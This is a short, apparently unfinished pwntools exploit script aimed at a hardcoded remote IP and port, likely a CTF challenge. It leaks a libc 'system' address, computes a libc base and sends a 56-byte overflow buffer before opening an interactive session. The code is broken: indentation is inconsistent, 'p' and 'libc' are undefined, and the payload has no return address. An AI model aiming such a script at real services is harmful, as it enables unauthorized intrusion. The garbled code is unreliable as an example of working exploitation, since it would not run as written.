from pwn import *
import struct

context.terminal = ['tmux', 'new-window']

rhost = "83.136.252.214" 
rport = "43228"

if args['NC']:
 	l = listen(9999)
	r = remote(rhost, rport) 
	svr = l.wait_for_connection()
	print(svr.recv())
    junk = p.recv(4096,timeout=2)
else:
   print("Required NC as args")


	r.send('hello')

leak = p.recvline()[-11:].rstrip(b"\n")
system = int(leak[2:],16)
log.info(hex(system))
libc.address = system - libc.symbols['system']

offset = 56
buffer = b""
buffer += b"A"*offset

gdb.attach(p, gdbscript='continue')
p.sendline(buffer)

p.interactive()

